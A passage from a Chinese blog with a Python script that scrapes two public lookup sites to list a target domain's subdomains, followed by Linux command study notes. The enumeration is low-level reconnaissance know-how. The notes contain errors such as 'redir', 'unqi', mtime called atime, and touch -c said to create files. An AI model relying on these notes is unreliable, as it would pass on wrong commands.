<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def zzzj(urls): #从站长之家获取子域名</span><br><span class="line">    url = &quot;https://tool.chinaz.com/subdomain/&quot;+str(urls)</span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;BAIDU_SSP_lcr=https://www.baidu.com/link?url=G6Z8y2tur1nTS4StdwzTd-i-z2l7NblTl3YnJh6mfWg7zK6cD7F7ZoVOSH2M3Rx6&amp;wd=&amp;eqid=a690ccbd000144ad0000000663046c7b; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; cz_statistics_visitor=4a4d8650-aa21-09c6-932c-8b7ac1147740; qHistory=aHR0cDovL3dob2lzLmNoaW5hei5jb20vX1dob2lz5p+l6K+ifGh0dHA6Ly90b29sLmNoaW5hei5jb20vc3ViZG9tYWluL1/lrZDln5/lkI3mn6Xor6I=; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234469; toolbox_urls=badui.com; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234446&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url=url, headers=header)</span><br><span class="line">    bf = BeautifulSoup(response.text, &#x27;html.parser&#x27;)</span><br><span class="line">    suop = bf.find_all(&#x27;a&#x27;, target=&#x27;_blank&#x27;)</span><br><span class="line">    list2 = []</span><br><span class="line">    for i in suop:</span><br><span class="line">        a = i.string</span><br><span class="line">        list2.append(a)</span><br><span class="line">    return list2</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我这里用到站长之家，为什么要查两个网站，因为确保准确性，如果两个网站都含有这个子域名，就证明这些子域名大概率是对的了。注意，站长之家如果不登录只能爬取前面五个子域名。</p>
<p>第四步，获取相同的子域名</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def main(urls): #将两个网站同时拥有的域名输出</span><br><span class="line">    czy(urls)   #运行czy函数</span><br><span class="line">    zzzj(urls)</span><br><span class="line">    a = set(czy(urls))  #将列表转化为元祖，因为元祖才可以进行对比操作</span><br><span class="line">    b = set(zzzj(urls))</span><br><span class="line">    c = (a &amp; b)   #找到相同的内容</span><br><span class="line">    for i in c:</span><br><span class="line">        print(i)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    urls = input(&quot;请输入你查询的网站&quot;)</span><br><span class="line">    main(urls)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def czy(urls):   #从查子域网站获取子域名</span><br><span class="line">    url = &#x27;https://chaziyu.com/&#x27;+str(urls)</span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;BAIDU_SSP_lcr=https://www.baidu.com/link?url=G6Z8y2tur1nTS4StdwzTd-i-z2l7NblTl3YnJh6mfWg7zK6cD7F7ZoVOSH2M3Rx6&amp;wd=&amp;eqid=a690ccbd000144ad0000000663046c7b; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; cz_statistics_visitor=4a4d8650-aa21-09c6-932c-8b7ac1147740; qHistory=aHR0cDovL3dob2lzLmNoaW5hei5jb20vX1dob2lz5p+l6K+ifGh0dHA6Ly90b29sLmNoaW5hei5jb20vc3ViZG9tYWluL1/lrZDln5/lkI3mn6Xor6I=; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234469; toolbox_urls=badui.com; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234446&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url=url, headers=header)</span><br><span class="line">    bf = BeautifulSoup(response.text, &#x27;html.parser&#x27;)</span><br><span class="line">    suop = bf.find_all(&#x27;a&#x27;, target=&#x27;_blank&#x27;)</span><br><span class="line">    list1 = []</span><br><span class="line">    for i in suop:</span><br><span class="line">        a = i.string</span><br><span class="line">        list1.append(a)</span><br><span class="line">    return list1</span><br><span class="line"></span><br><span class="line">def zzzj(urls): #从站长之家获取子域名</span><br><span class="line">    url = &quot;https://tool.chinaz.com/subdomain/&quot;+str(urls)</span><br><span class="line">    header = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;BAIDU_SSP_lcr=https://www.baidu.com/link?url=G6Z8y2tur1nTS4StdwzTd-i-z2l7NblTl3YnJh6mfWg7zK6cD7F7ZoVOSH2M3Rx6&amp;wd=&amp;eqid=a690ccbd000144ad0000000663046c7b; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1661234319; cz_statistics_visitor=4a4d8650-aa21-09c6-932c-8b7ac1147740; qHistory=aHR0cDovL3dob2lzLmNoaW5hei5jb20vX1dob2lz5p+l6K+ifGh0dHA6Ly90b29sLmNoaW5hei5jb20vc3ViZG9tYWluL1/lrZDln5/lkI3mn6Xor6I=; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234469; toolbox_urls=badui.com; Hm_lvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234431; Hm_lpvt_ca96c3507ee04e182fb6d097cb2a1a4c=1661234446&quot;,</span><br><span class="line">        &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    response = requests.get(url=url, headers=header)</span><br><span class="line">    bf = BeautifulSoup(response.text, &#x27;html.parser&#x27;)</span><br><span class="line">    suop = bf.find_all(&#x27;a&#x27;, target=&#x27;_blank&#x27;)</span><br><span class="line">    list2 = []</span><br><span class="line">    for i in suop:</span><br><span class="line">        a = i.string</span><br><span class="line">        list2.append(a)</span><br><span class="line">    return list2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main(urls): #将两个网站同时拥有的域名输出</span><br><span class="line">    czy(urls)</span><br><span class="line">    zzzj(urls)</span><br><span class="line">    a = set(czy(urls))</span><br><span class="line">    b = set(zzzj(urls))</span><br><span class="line">    c = (a &amp; b)</span><br><span class="line">    for i in c:</span><br><span class="line">        print(i)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    urls = input(&quot;请输入你查询的网站&quot;)</span><br><span class="line">    main(urls)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="运行实例"><a href="#运行实例" class="headerlink" title="运行实例"></a>运行实例</h1><p><img src="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/dsdadisdafasfafs.png"></p>
<p>成功获得子域名，但是站长之家不登录只返回5条，所以这里只有5条记录</p>
<p>——————————————————————————————————————————————————</p>
<p>requests库借鉴文章:[(24条消息) Python Requests库安装和使用_睿科知识云的博客-CSDN博客_python request库安装](<a target="_blank" rel="noopener" href="https://blog.csdn.net/ccc369639963/article/details/123421449#:~:text=Python">https://blog.csdn.net/ccc369639963/article/details/123421449#:~:text=Python</a> requests Requests 是 Python 的第三方库，它的安装非常简便，如下所示： python -m,urllib 的基础上开发而来，它使用 Python 语言编写，并且采用了 Apache2 Licensed（一种开源协议）的 HTTP 库。)</p>
<p>bs4借鉴文章：<a target="_blank" rel="noopener" href="http://c.biancheng.net/python_spider/bs4.html">http://c.biancheng.net/python_spider/bs4.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://2324152038.github.io/2022/09/05/Linux%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://chunquchunlai.oss-cn-chengdu.aliyuncs.com/3705DE5E0A790DFCC780E4AD61EFC4A6.jpg">
      <meta itemprop="name" content="春去春来">
      <meta itemprop="description" content="登峰造极境">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="RISE">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/05/Linux%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">Liunx基础</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-09-05 10:52:55 / 修改时间：13:01:22" itemprop="dateCreated datePublished" datetime="2022-09-05T10:52:55+08:00">2022-09-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Linux%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">Linux基础</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我看鸟哥的linux私房菜，总结出的知识点，不全面，但都是一些比较常用的命令，和工具的用法</p>
<p>鸟哥的私房菜网址：<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-tutorial.html">Linux 教程 | 菜鸟教程 (runoob.com)</a></p>
<h1 id="Linux的文件权限与目录配置"><a href="#Linux的文件权限与目录配置" class="headerlink" title="Linux的文件权限与目录配置"></a>Linux的文件权限与目录配置</h1><ol>
<li><h2 id="查看所有文件和其权限"><a href="#查看所有文件和其权限" class="headerlink" title="查看所有文件和其权限"></a>查看所有文件和其权限</h2></li>
</ol>
<p>​        ls -al</p>
<ol start="2">
<li><h2 id="修改文件权限"><a href="#修改文件权限" class="headerlink" title="修改文件权限"></a>修改文件权限</h2>chown 修改文件所有者</li>
</ol>
<p>​       chgrp   修改文件所属用户组</p>
<p>​       chmod 修改文件的权限</p>
<ol start="3">
<li><h2 id="文件种类与扩展名"><a href="#文件种类与扩展名" class="headerlink" title="文件种类与扩展名"></a>文件种类与扩展名</h2></li>
</ol>
<p>​        一般文件（-）</p>
<p>​        目录文件（d）</p>
<p>​        链接文件（l）</p>
<p>​        设备与设备文件（b&#x2F;c)     一般保存在&#x2F;dev 目录下</p>
<p>​        数据接口文件（s）</p>
<p>​        数据传输文件 （p）</p>
<ol start="4">
<li><h2 id="三层目录"><a href="#三层目录" class="headerlink" title="三层目录"></a>三层目录</h2></li>
</ol>
<p>​      &#x2F;      root根目录 与启动系统有关</p>
<p>​       &#x2F;usr  与软件安装执行有关</p>
<p>​      &#x2F;var 与系统运行过程有关</p>
<h3 id="一-x2F-root目录下"><a href="#一-x2F-root目录下" class="headerlink" title="一.      &#x2F;     root目录下"></a>一.      &#x2F;     root目录下</h3><p>​       &#x2F;bin  存放有很多执行文件的目录</p>
<p>​      &#x2F;boot  主要放置启动时使用的命令</p>
<p>​      &#x2F;dev   存放设备和设备接口的文件</p>
<p>​      &#x2F;etc    系统的主要配置文件几乎都放置在这个区域      &#x2F;etc&#x2F;passwd </p>
<p>​      &#x2F;lib     放置启动时用到的函数库以及&#x2F;bin&#x2F;sbin下面会调用的函数库</p>
<p>​      &#x2F;run  放置系统启动时放置的各类信息</p>
<p>​      &#x2F;home  创建新的用户时，会创建一个家目录</p>
<p>​      &#x2F;root 系统管理员的家目录</p>
<p>​      &#x2F;usr</p>
<p>​      &#x2F;var</p>
<h3 id="二-x2F-usr-目录下"><a href="#二-x2F-usr-目录下" class="headerlink" title="二.&#x2F;usr  目录下"></a>二.&#x2F;usr  目录下</h3><p>​     &#x2F;usr&#x2F;local&#x2F; 放置系统管理员本机下安装的软件</p>
<p>​     &#x2F;usr&#x2F;src&#x2F;   一般的源代码建议放到这里</p>
<h3 id="三-x2F-var-目录下"><a href="#三-x2F-var-目录下" class="headerlink" title="三. &#x2F;var  目录下"></a>三. &#x2F;var  目录下</h3><p>​     &#x2F;var&#x2F;cache&#x2F; 应用程序本身会产生的一些缓存</p>
<p>​    &#x2F;var&#x2F;lock&#x2F;  上锁设备</p>
<p>​    &#x2F;var&#x2F;log&#x2F; 放置的日志文件  &#x2F;var&#x2F;log&#x2F;messages    &#x2F;var&#x2F;log&#x2F;wtmp  记录登录信息</p>
<p>\5.  ..&#x2F;   返回上层目录</p>
<p>​       .&#x2F;   表示当前目录</p>
<h1 id="Linux文件与目录管理"><a href="#Linux文件与目录管理" class="headerlink" title="Linux文件与目录管理"></a>Linux文件与目录管理</h1><ol>
<li><h2 id="常见处理目录的命令"><a href="#常见处理目录的命令" class="headerlink" title="常见处理目录的命令"></a>常见处理目录的命令</h2></li>
</ol>
<p>​       cd  切换目录</p>
<p>​       pwd  显示当前目录</p>
<p>​       mkdir  创建一个新目录     mkdir  -p 直接依序创建目录    mkdir -m   711  设置默认权限</p>
<p>​       redir   删除一个新目录</p>
<ol start="2">
<li><h2 id="关于环境变量-PATH"><a href="#关于环境变量-PATH" class="headerlink" title="关于环境变量$PATH"></a>关于环境变量$PATH</h2></li>
</ol>
<p>​       echo  $PATH  查看当前PATH</p>
<ol start="3">
<li><h2 id="文件和目录查看"><a href="#文件和目录查看" class="headerlink" title="文件和目录查看"></a>文件和目录查看</h2></li>
</ol>
<p>​       ls</p>
<p>​       ls -a 全部文件，包括隐藏文件</p>
<p>​       ls -d 仅列出目录本身</p>
<p>​       ls -l  显示详细信息</p>
<p>​       ls –full-time 列出完整的时间</p>
<ol start="4">
<li><h2 id="复制，移动，删除"><a href="#复制，移动，删除" class="headerlink" title="复制，移动，删除"></a>复制，移动，删除</h2></li>
</ol>
<p>​      cp 复制  cp -a(复制所有) -f（强制）-p（文件属性一起复制过去）-r（递归复制） 源文件 .(复制到当前目录)           目标文件  </p>
<p>​     mv 移动（剪切）mv -f(强制)  </p>
<p>​     rm 删除    rm -f（忽略不存在的文件） -r（递归删除）-i（删除前询问是否删除）</p>
<ol start="5">
<li><h2 id="查看文件内容"><a href="#查看文件内容" class="headerlink" title="查看文件内容"></a>查看文件内容</h2></li>
</ol>
<p>​       cat 从第一行显示内容</p>
<p>​       tac 从最后一行显示内容</p>
<p>​       nl 显示时输出行号</p>
<p>​       more 一页一页的显示</p>
<p>​       less 与more类似，但可以 往前翻页   &#x2F;向下查找字符串  ?向上查找字符串</p>
<p>​       head -n   显示几行</p>
<p>​       tail -n显示后面几行</p>
<ol start="6">
<li><h2 id="od-非纯文本文件"><a href="#od-非纯文本文件" class="headerlink" title="od 非纯文本文件"></a>od 非纯文本文件</h2></li>
</ol>
<p>​       od -t c  源文件</p>
<ol start="7">
<li><h2 id="修改文件时间或创建新文件-touch"><a href="#修改文件时间或创建新文件-touch" class="headerlink" title="修改文件时间或创建新文件 touch"></a>修改文件时间或创建新文件 touch</h2></li>
</ol>
<p>​       touch -a 近定义自定义时间 access time（读取时间）</p>
<p>​       touch -c 仅修改文件时间，若文件不存在则创建</p>
<p>​       touch -m 仅修改mtime</p>
<p>​       touch -d  “2 days ago” 目标文件  后 面接自定义的时间</p>
<ol start="8">
<li><h2 id="文件默认权限"><a href="#文件默认权限" class="headerlink" title="文件默认权限"></a>文件默认权限</h2><p>umask</p>
</li>
<li><h2 id="文件隐藏属性"><a href="#文件隐藏属性" class="headerlink" title="文件隐藏属性"></a>文件隐藏属性</h2></li>
</ol>
<p>​       配置文件隐藏属性 chattr</p>
<p>​       -a  文件只能增加数据，不能删除或修   </p>
<p>​       -i  不能增删改查</p>
<p>​       显示文件隐藏属性  lsattr</p>
<ol start="10">
<li><h2 id="观察文件类型"><a href="#观察文件类型" class="headerlink" title="观察文件类型"></a>观察文件类型</h2></li>
</ol>
<p>​       file</p>
<ol start="11">
<li><h2 id="查找执行文件-which"><a href="#查找执行文件-which" class="headerlink" title="查找执行文件 which"></a>查找执行文件 which</h2></li>
</ol>
<p>​       -a 将path的目录全部列出</p>
<ol start="12">
<li><h2 id="查找文件"><a href="#查找文件" class="headerlink" title="查找文件"></a>查找文件</h2></li>
</ol>
<p>​       whereis</p>
<p>​       locate -i（忽略大小写）</p>
<p>​       find    </p>
<h1 id="Linux磁盘与文件系统管理"><a href="#Linux磁盘与文件系统管理" class="headerlink" title="Linux磁盘与文件系统管理"></a>Linux磁盘与文件系统管理</h1><ol>
<li><h2 id="所有物理磁盘的文件名都被模拟成-x2F-dev-x2F-sd【a-p】的格式"><a href="#所有物理磁盘的文件名都被模拟成-x2F-dev-x2F-sd【a-p】的格式" class="headerlink" title="所有物理磁盘的文件名都被模拟成&#x2F;dev&#x2F;sd【a-p】的格式"></a>所有物理磁盘的文件名都被模拟成&#x2F;dev&#x2F;sd【a-p】的格式</h2></li>
</ol>
<p>​      &#x2F;dev&#x2F;sd【a-p】【1-128】物理磁盘的文件名</p>
<p>​      &#x2F;dev&#x2F;vd【a-d】【1-128】虚拟磁盘的文件名</p>
<ol start="2">
<li><h2 id="文件系统特性"><a href="#文件系统特性" class="headerlink" title="文件系统特性"></a>文件系统特性</h2></li>
</ol>
<p>​      1.超级区块 记录此文件的整体信息</p>
<p>​      2. inode     记录文件的属性，一个文件占一个inode00</p>
<p>​      3.数据区块 记录文件内容</p>
<p>​      <strong>inode 记录的数据至少以下几种</strong></p>
<p>​      文件的读写属性（read，write，excute）</p>
<p>​      文件的拥有者与用户组（owner，group）</p>
<p>​      文件的大小</p>
<p>​      文件的建立或状态改变的时间（ctime）</p>
<p>​      最近一次读取的时间（atime）</p>
<p>​      最近修改的时间（atime）</p>
<p>​      <strong>超级区块记录的数据主要有</strong></p>
<p>​      数据区块与inode的总量       </p>
<p>​      未使用和已经使用的inode的数据区块总量</p>
<p>​      数据区块与inode的大小（block为1k，2k，3k，inode为128b或者256b）</p>
<p>​      文件的挂载时间，最近一次写入数据的时间</p>
<p>​      <strong>dumpe2fs 查询ext系列超级区块的信息的命令</strong></p>
<ol start="3">
<li><h2 id="与目录树的关系"><a href="#与目录树的关系" class="headerlink" title="与目录树的关系"></a>与目录树的关系</h2></li>
</ol>
<p>​       ls -i  查询inode的号码</p>
<ol start="4">
<li><h2 id="文件系统的简单操作"><a href="#文件系统的简单操作" class="headerlink" title="文件系统的简单操作"></a>文件系统的简单操作</h2></li>
</ol>
<p>​       df: 列出文件系统的整体磁盘使用量   -h 以人们好阅读的格式显示</p>
<p>​       du:查看当前目录的所占空间</p>
<ol start="5">
<li><h2 id="硬连接与符号连接-ln"><a href="#硬连接与符号连接-ln" class="headerlink" title="硬连接与符号连接 ln"></a>硬连接与符号连接 ln</h2></li>
</ol>
<p>​       硬连接 将两个文件inode号码连接到一起 所有相关信息都一样除了文件名</p>
<p>​       符号连接    相当于快捷方式 如果源文件不在了，链接文件也会打不开</p>
<p>​       ln 不加参数就是硬连接，-s参数就是符号连接</p>
<ol start="6">
<li><h2 id="观察磁盘分区状态"><a href="#观察磁盘分区状态" class="headerlink" title="观察磁盘分区状态"></a>观察磁盘分区状态</h2></li>
</ol>
<p>​       lsblk </p>
<h1 id="Linux文件与文件系统压缩"><a href="#Linux文件与文件系统压缩" class="headerlink" title="Linux文件与文件系统压缩"></a>Linux文件与文件系统压缩</h1><ol>
<li><h2 id="常见的压缩文件扩展名"><a href="#常见的压缩文件扩展名" class="headerlink" title="常见的压缩文件扩展名"></a>常见的压缩文件扩展名</h2></li>
</ol>
<p>​       .z compress程序压缩文件</p>
<p>​       .zip zip程序的压缩文件</p>
<p>​       .gz   gzip程序的压缩文件</p>
<p>​       .bz   bzip2程序的压缩文件</p>
<p>​       .xz   xz程序的压缩文件</p>
<p>​       .tar tar程序打包文件，没有被压缩   .tat.gz     .tar.bz2  .tar.xz</p>
<ol start="2">
<li><h2 id="gzip"><a href="#gzip" class="headerlink" title="gzip"></a>gzip</h2></li>
</ol>
<p>​       gzip 应用最广的压缩命令</p>
<p>​       gzip -v显示压缩比例 -d解压缩  文件名</p>
<p>​       zcat  将gzip文件读出来</p>
<ol start="3">
<li><h2 id="bzip2"><a href="#bzip2" class="headerlink" title="bzip2"></a>bzip2</h2></li>
</ol>
<p>​       和gzip用法一样 -v -d</p>
<ol start="4">
<li><h2 id="xz"><a href="#xz" class="headerlink" title="xz"></a>xz</h2></li>
</ol>
<p>​      用法也一样</p>
<ol start="5">
<li><h2 id="打包命令-tar"><a href="#打包命令-tar" class="headerlink" title="打包命令 tar"></a>打包命令 tar</h2></li>
</ol>
<p>​      -j  通过bzip2的支持进行压缩   -c 建立打包文件，可搭配-v来查看被打包的文件名</p>
<p>​      -t  查看打包文件有哪些文件名 -x解包或解压缩功能   -f  filename后面接要被处理的文件名</p>
<p>​      -p 保存原本文件的权限与属性</p>
<p>​      压缩 tar-jcv -f 文件名.tar.bz2</p>
<p>​      查询  tar-jtv -f  文件名.tar.bz2</p>
<p>​      解压缩 tar-jxv -f 文件名.tar.bzc   -C 预压缩的目录</p>
<h1 id="VIM程序编辑器"><a href="#VIM程序编辑器" class="headerlink" title="VIM程序编辑器"></a>VIM程序编辑器</h1><ol>
<li><h2 id="vi有三种模式"><a href="#vi有三种模式" class="headerlink" title="vi有三种模式"></a>vi有三种模式</h2></li>
</ol>
<p>​      一般命令模式</p>
<p>​      编辑模式[输入i]</p>
<p>​      命令行模式[输入:]</p>
<ol start="2">
<li><p>使用vi进入命令行模式</p>
</li>
<li><h2 id="一般模式"><a href="#一般模式" class="headerlink" title="一般模式"></a>一般模式</h2></li>
</ol>
<p>​      ctrl+f 向下移动一页</p>
<p>​      ctrl+b 向上移动一页</p>
<p>​      0  移动到这一行最前面一个字符</p>
<p>​      $  移动到这一行最后一个字符</p>
<p>​      G 移动到这个文件的最后一行</p>
<p>​      nG  n为数字，移动到这个文件第n行</p>
<p>​      gg 移动到这个文件第一行</p>
<p>​      &#x2F;word 在光标之下寻找第一个名称为word的字符串</p>
<p>​      ?word 在关标之上寻找第一个名称为word的字符串</p>
<p>​      ： n1，n2s&#x2F;word1&#x2F;word2&#x2F;g  n1,n2为数字，在第n1和n2行间寻找word1，然后替换为word2</p>
<p>​      x与X x删除后面一个字符 X删除光标前面一个字符</p>
<p>​      nx n为数字</p>
<p>​      dd 剪切光标所在哪一行 ndd 剪切那n行</p>
<p>​      yy 复制光标所在哪一行 nyy</p>
<p>​      p和P p将已复制的数据在光标下面一行粘贴 P 上一行粘贴</p>
<p>​      u 恢复上一个操作</p>
<p>​      .  重做上一个操作</p>
<p>​      r和R 进入替换模式 r只会替换光标所在的那一个字符一次 R会一直替换光标所在的文字</p>
<p>​      :set  nu 显示行号 </p>
<p>​      ：！command 暂时退出vi到命令行执行command的显示结果</p>
<p>​      v 字符选择  V 行选择  ctrl+v 用矩阵的方式选择  y 将选择的地方复制  d 删除</p>
<ol start="4">
<li><h2 id="多窗口模式"><a href="#多窗口模式" class="headerlink" title="多窗口模式"></a>多窗口模式</h2></li>
</ol>
<p>​      ：sp{filename}   不加filename就是在当前文件两个窗口</p>
<p>​      ctrl+w+j  进入下面一个窗口</p>
<p>​      ctrl+w+k 进入上面一个窗口</p>
<ol start="5">
<li><h2 id="整体的vim设置放在-x2F-etc-x2F-vimrc里面"><a href="#整体的vim设置放在-x2F-etc-x2F-vimrc里面" class="headerlink" title="整体的vim设置放在&#x2F;etc&#x2F;vimrc里面"></a>整体的vim设置放在&#x2F;etc&#x2F;vimrc里面</h2></li>
</ol>
<h1 id="认识和学习bash"><a href="#认识和学习bash" class="headerlink" title="认识和学习bash"></a>认识和学习bash</h1><ol>
<li><h2 id="Bash-shell"><a href="#Bash-shell" class="headerlink" title="Bash shell"></a>Bash shell</h2></li>
</ol>
<p>​      history 历史命名  !n 执行第n条命名   !! 执行上一条命名</p>
<p>​      Tab键 补全键</p>
<p>​      alias 命令别名设置功能 lm&#x3D;”ls-al”</p>
<ol start="2">
<li><h2 id="变量的使用与设置"><a href="#变量的使用与设置" class="headerlink" title="变量的使用与设置"></a>变量的使用与设置</h2></li>
</ol>
<p>​      echo 变量的使用与设置 </p>
<p>​      unset 取消变量</p>
<ol start="3">
<li><h2 id="环境变量功能"><a href="#环境变量功能" class="headerlink" title="环境变量功能"></a>环境变量功能</h2></li>
</ol>
<p>​      env 查看当前环境变量及内容</p>
<p>​      set  查看全部环境变量</p>
<p>​      export  自定义变量转成环境变量 </p>
<ol start="4">
<li><p>ps1:（提升字符设置）</p>
</li>
<li><p>locale 显示结果的语系变量  .</p>
</li>
<li><p>read 读取来自键盘输入的变量</p>
</li>
<li><p>declare 申明变量类型 -a 数组类型 -i 整数类型 -x 环境变量</p>
</li>
<li><p>从前面开始删除变量</p>
</li>
<li><p>% 从前面开始删除变量</p>
</li>
</ol>
<p>10  &#x2F; 旧字符串&#x2F;新字符串 将第一个变量替换成第二个  &#x2F;&#x2F;匹配到的全部替换</p>
<ol start="11">
<li><p>登录画面内容在 &#x2F;etc&#x2F;issue 里面设置</p>
</li>
<li><h2 id="login-shell-和-non-login-shell"><a href="#login-shell-和-non-login-shell" class="headerlink" title="login shell 和 non-login shell"></a>login shell 和 non-login shell</h2></li>
</ol>
<p>​       login shell 取得bash时需要的完整的登录流程，会读取两个文件 &#x2F;etc&#x2F;peofile 系统的整体设计</p>
<p>​                                                                                                               ~&#x2F;.bash_profile 用户的个人设置</p>
<p>​        non-login shell 取得bash的方法不需要重复登录的操作 </p>
<ol start="13">
<li><h2 id="终端环境变量设置"><a href="#终端环境变量设置" class="headerlink" title="终端环境变量设置"></a>终端环境变量设置</h2>stty 和set</li>
</ol>
<p>​       查看按键内容 stty  </p>
<p>​       终端变量设置 set </p>
<ol start="14">
<li><h2 id="数据留重定向"><a href="#数据留重定向" class="headerlink" title="数据留重定向"></a>数据留重定向</h2></li>
</ol>
<p>​       标准输入 代码0  ，使用&lt; 或 &lt;&lt;</p>
<p>​       标准输出  代码1，使用&gt; 或&gt;&gt;</p>
<p>​       标准错误输出  代码2， 使用2&gt; 或  2&gt;&gt;</p>
<ol start="15">
<li><h2 id="命令执行的判断依据-amp-amp-和"><a href="#命令执行的判断依据-amp-amp-和" class="headerlink" title="命令执行的判断依据 &amp;&amp; 和 ||"></a>命令执行的判断依据 &amp;&amp; 和 ||</h2></li>
</ol>
<p>​       cmd1&amp;&amp;cnd2 若cmd1执行错误，则不执行cmd2</p>
<p>​       cmd1||cmd2   若cmd1执行错误，则执行cmd2</p>
<ol start="16">
<li><h2 id="排序命令"><a href="#排序命令" class="headerlink" title="排序命令"></a>排序命令</h2></li>
</ol>
<p>​       sort 排序</p>
<p>​       unqi 排序完成了，将重复的数据只列出一个显示</p>
<p>​       wc 查看多少文字和字符</p>
<ol start="17">
<li><h2 id="字符转换命令"><a href="#字符转换命令" class="headerlink" title="字符转换命令"></a>字符转换命令</h2></li>
</ol>
<p>​       tr  删除信息中的一段文字或进行替换</p>
<p>​       join 两个文件当中，有相同数据的哪一行加起来</p>
<ol start="18">
